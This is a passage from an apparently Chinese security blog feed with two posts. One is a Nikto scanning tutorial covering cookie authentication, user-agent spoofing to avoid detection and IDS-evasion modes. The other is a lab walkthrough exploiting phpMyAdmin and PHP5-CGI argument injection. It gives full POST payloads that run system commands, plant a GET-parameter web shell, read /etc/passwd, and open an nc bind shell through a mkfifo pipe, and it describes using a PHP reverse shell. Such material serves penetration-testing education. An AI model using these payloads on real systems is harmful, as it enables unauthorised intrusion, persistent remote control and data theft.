443 -ssl </span><br><span class="line"></span><br><span class="line">#扫描多个目标,将目标地址存放在某个文本文档中,</span><br><span class="line">#目标地址格式为:http://主机名:端口或者IP地址:端口或者直接是IP地址</span><br><span class="line">root@kali:~# nikto -host host.txt </span><br><span class="line"></span><br><span class="line">#使用nmap扫描目标网段的80端口,将开放80端口的主机IP筛选出后传送给nikto进行扫描web服务漏洞,</span><br><span class="line">#参数-oG表示输出便于通过bash或者perl处理的格式,非xml</span><br><span class="line">root@kali:~# nmap -p80 192.168.136.129/24 -oG - | nikto -host - </span><br><span class="line"></span><br><span class="line">#nikto支持代理功能</span><br><span class="line">root@kali:~# nikto -host 192.168.1.1 -useproxy http://localhost:8087</span><br><span class="line"></span><br><span class="line">Nikto互动功能:</span><br><span class="line">Nikto包含几个可在活动扫描期间更改的选项，前提是它在提供POSIX支持的系统上运行，其中包括unix和其他一些操作系统。</span><br><span class="line">在没有POSIX支持的系统上，将以静默方式禁用这些功能。</span><br><span class="line"></span><br><span class="line">在主动扫描期间，按下面任何一个键将打开或关闭列出的功能或执行列出的操作。</span><br><span class="line">请注意，这些区分大小写。</span><br><span class="line"></span><br><span class="line">SPACE - 报告当前扫描状态</span><br><span class="line"></span><br><span class="line">v - 打开/关闭详细模式</span><br><span class="line"></span><br><span class="line">d - 打开/关闭调试模式,极其详细信息</span><br><span class="line"></span><br><span class="line">e - 打开/关闭错误报告</span><br><span class="line"></span><br><span class="line">p - 打开/关闭进度报告</span><br><span class="line"></span><br><span class="line">r - 打开/关闭重定向显示</span><br><span class="line"></span><br><span class="line">c - 打开/关闭cookie显示</span><br><span class="line"></span><br><span class="line">o - 打开/关闭OK显示</span><br><span class="line"></span><br><span class="line">a - 打开/关闭验证显示</span><br><span class="line"></span><br><span class="line">q - 退出</span><br><span class="line"></span><br><span class="line">N - 下一个主持人</span><br><span class="line"></span><br><span class="line">P - 暂停,大写P</span><br><span class="line">cookie简介[cookie wiki](https://zh.wikipedia.org/wiki/Cookie)</span><br><span class="line">因为HTTP协议是无状态的，即服务器不知道用户上一次做了什么，</span><br><span class="line">这严重阻碍了交互式Web应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。</span><br><span class="line">最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，</span><br><span class="line">所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。</span><br><span class="line">服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。</span><br><span class="line"></span><br><span class="line">在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。</span><br><span class="line">当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。</span><br><span class="line">用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。</span><br><span class="line"></span><br><span class="line">Cookie另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。</span><br><span class="line">如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，</span><br><span class="line">服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。</span><br><span class="line">第二次登录时，如果该Cookie尚未到期，浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。</span><br><span class="line"></span><br><span class="line">修改nikto的配置文件,写入cookie信息,即可扫描那些需要身份认证才可以访问的页面</span><br><span class="line">root@kali:~# vim /etc/nikto.conf #编辑其配置文件</span><br><span class="line">修改USERAGENT,防止扫描的时候被系统管理员发现(我目前设置为win10的浏览器)</span><br><span class="line">USERAGENT=Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko (Evasions:@EVASIONS) (Test:@TESTID)</span><br><span class="line">设置用户代理的方法:使用火狐浏览器登陆[User-Agent Switcher](https://addons.mozilla.org/zh-CN/firefox/addon/user-agent-switcher-revived/?src=search),</span><br><span class="line">添加到Firefox,在右上角打开图标!</span><br></pre></td></tr></table></figure><p><img src="1.png" alt=""><br><img src="2.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">在STATIC-COOKIE这个命令下取消注释,</span><br><span class="line">输入cookie信息,格式为&quot;cookie name1&quot;=&quot;value&quot;;&quot;cookie name2&quot;=&quot;value&quot;</span><br><span class="line">(可以设置多个cookie) </span><br><span class="line">STATIC-COOKIE=&quot;PHPSESSION&quot;=&quot;9eb59920d99db2871254303ec47b3460&quot;;&quot;security&quot;=&quot;high&quot;</span><br><span class="line">(这是我的cookie,需要自行抓取cookie信息) </span><br><span class="line">然后保存退出,在终端开始用扫描(cookie扫描),将会获得更有效的扫描结果</span><br><span class="line"></span><br><span class="line"># nikto加参数-evasion表示使用LibWhisker中对IDS的躲避技术,防止被发现,</span><br><span class="line">root@kali:~# nikto -host http://192.168.136.129 </span><br><span class="line">可使用以下几种类型: </span><br><span class="line">• 1 随机URL编码(非UTF-8方式) </span><br><span class="line">• 2 自选择路径(/./) </span><br><span class="line">• 3 过早结束的URL </span><br><span class="line">• 4 优先考虑长随机字符串</span><br><span class="line">• 5 参数欺骗 </span><br><span class="line">• 6 使用TAB作为命令的分隔符 </span><br><span class="line">• 7 使用变化的URL </span><br><span class="line">• 8 使用Windows路径分隔符&quot;\&quot; </span><br><span class="line"></span><br><span class="line">#使用第一种,第六种,第七种方法,自行搭配</span><br><span class="line">root@kali:~# nikto -host http://192.168.136.129 -evasion 167</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;div align=&quot;middle&quot;&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outcha
      
    
    </summary>
    
      <category term="kali" scheme="https://louisnie.github.io/categories/kali/"/>
    
    
      <category term="tools" scheme="https://louisnie.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>手动挖掘之默认安装漏洞</title>
    <link href="https://louisnie.github.io/2018/10/23/%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E4%B9%8B%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E6%BC%8F%E6%B4%9E-1/"/>
    <id>https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/</id>
    <published>2018-10-23T15:15:28.000Z</published>
    <updated>2018-10-23T15:25:06.264Z</updated>
    
    <content type="html"><![CDATA[<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=5181411&auto=0&height=66"></iframe></div><h2 id="phpMyAdmin默认安装漏洞"><a href="#phpMyAdmin默认安装漏洞" class="headerlink" title="phpMyAdmin默认安装漏洞"></a>phpMyAdmin默认安装漏洞</h2><p>大家好,欢迎来到我的博客,这是我第一次使用该博客去发表文章,内心激动不已,那么让我们聊聊默认安装带来的安全问题吧.</p><p>phpMyAdmin是phpMyAdmin团队开发的一套免费的、基于Web的MySQL数据库管理工具。该工具能够创建和删除数据库，创建、删除、修改数据库表，执行SQL脚本命令等。</p><p>其安装在Web服务器上的接口界面,主要用于使用php来管理安装服务器上的后台数据库(MySQL数据库),但如果采用默认安装,敏感路径未做出处理,便会存在安全漏洞,最突出的是其setup脚本中存在着服务器端请求伪造漏洞。远程攻击者可利用该漏洞执行未授权的操作。</p><p>以下版本受到影响：phpMyAdmin 4.0.10.19之前的版本，4.4.15.10之前的4.4.x版本，4.6.6之前的4.6.x版本。</p><p>如果目标系统采用php语言搭建的环境,那么可以尝试使用一些扫描软件或者手动爬网去试图发现是否存在phpmyadmin目录.</p><p>测试环境:<br>kali:192.168.128.128/24<br>Metasploitable:192.168.128.129/24</p><p>1,存在phpmyadmin界面:<br><img src="1.png" alt=""><br>如果用户未对phpmyadmin目录下的setup文件进行安全处理,那普通用户可以在不进行身份认证的情况下,便可以配置服务器信息(防范措施:不允许其他用户从公网访问phpMyAdmin目录或者禁止访问setup文件)<br><img src="2.png" alt=""></p><p>我们可以通过构造参数执行配置指令,并利用php伪协议提交post内容执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST http://192.168.128.129/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1      </span><br><span class="line"> #问号及其后面的内容用于修改修改php的主配置文件php.ini，从而可以执行下面插入的php代码</span><br><span class="line"></span><br><span class="line">Host: 192.168.128.128 </span><br><span class="line"></span><br><span class="line">Content-Length: 35</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">passthru(&apos;id&apos;);        </span><br><span class="line"> #passthru() 函数用于调用系统命令，并把命令的运行结果原样地直接输出到标准输出设备上。</span><br><span class="line"> #也可以将id命令换成其他Linux命令去获取web系统的数据,目前使用的是普通用户www-date,权限有限</span><br><span class="line"></span><br><span class="line">die();                </span><br><span class="line"> #die() 函数输出一条消息，并退出当前脚本,此处使用为了避免获取多余无用的信息</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以使用Burpsuite的Repeater工具该发送post请求,获取目标的信息<img src="3.png" alt=""><br>由刚刚的id命令得知目前的用户为www-data,由查看账户信息得知其主目录为/var/www,那么便可以向其主目录写入木马,以实现远程控制的效果<br><img src="4.png" alt=""><br><img src="5.png" alt=""></p><p>命令如下: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST http://192.168.128.129/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1</span><br><span class="line">Host: 192.168.128.128 </span><br><span class="line">Content-Length: 102</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">passthru(&apos;echo &quot;&lt;?php \$cmd = \$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot; &gt;/var/www/2.php&apos;);</span><br><span class="line">#该木马表示将GET方式获取的指令赋值于cmd命令,并使用system()函数运行cmd变量存储的命令</span><br><span class="line">#反斜杠作用:避免服务器将上传内容过滤,输入命令无效</span><br><span class="line">die();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过在浏览器访问该木马,便可获取目标系统的shell<br><img src="6.png" alt=""> </p><p>使用kali中的php脚本获取反弹shell</p><p>反弹shell:指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，那么我们就可以在本地使用被攻击主机的命令并且不容易被发现</p><p>kali中的PHP的反弹shell为:/usr/share/webshells/php/php-reverse-shell.php<img src="7.png" alt=""><br>然后编辑php/php-reverse-shell.php,修改ip地址为本机kali的地址,端口号选1024-65535之内任意(1-1023端口已经被系统服务占用) <img src="8.png" alt=""></p><p>使用nc命令在本地(kali主机)监听本地1234端口<img src="9.png" alt=""><br>然后将php-reverse-shell.php的内容粘贴至发送的POST请求中,点击go<br><img src="10.png" alt=""><br><img src="11.png" alt=""> </p><h2 id="Ubuntu-Debain默认安装PHP5-CGI漏洞"><a href="#Ubuntu-Debain默认安装PHP5-CGI漏洞" class="headerlink" title="Ubuntu/Debain默认安装PHP5-CGI漏洞"></a><strong>Ubuntu/Debain默认安装PHP5-CGI漏洞</strong></h2><p>其针对Apache/PHP远程代码执行漏洞攻击<br>该漏洞存在于使用PHP的Apache服务器，在Debian和Ubuntu的服务器上默认安装php5-cgi模块的服务器都存在此漏洞。<br>程序员可以使用CGI模块在PHP代码中调用操作系统的命令<br>如果安装了PHP5-CGI,则会在/usr/lib/cgi-bin下面生成两个二进制文件:php和php5<br><img src="12.png" alt=""><br>我们发送编码后的参数信息(编码是为了防止服务器过滤信息)去获取目标服务器的shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST </span><br><span class="line">/cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 123</span><br><span class="line"></span><br><span class="line">Content-Length: 45</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo system(&apos;cat /etc/passwd&apos;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="13.png" alt=""><br>其实将刚刚编码的数据进行解码,可以看到其实就是PHP的参数数据<br><img src="14.png" alt=""></p><p>也可以让服务器主动打开一个端口,然后在本地使用nc去连接<br>代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 123</span><br><span class="line"></span><br><span class="line">Content-Length: 86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo system(&apos;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe&apos;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="15.png" alt=""><br><img src="16.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;div align=&quot;middle&quot;&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outcha
      
    
    </summary>
    
      <category term="WEB安全" scheme="https://louisnie.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="手工挖掘漏洞" scheme="https://louisnie.github.io/tags/%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
</feed>
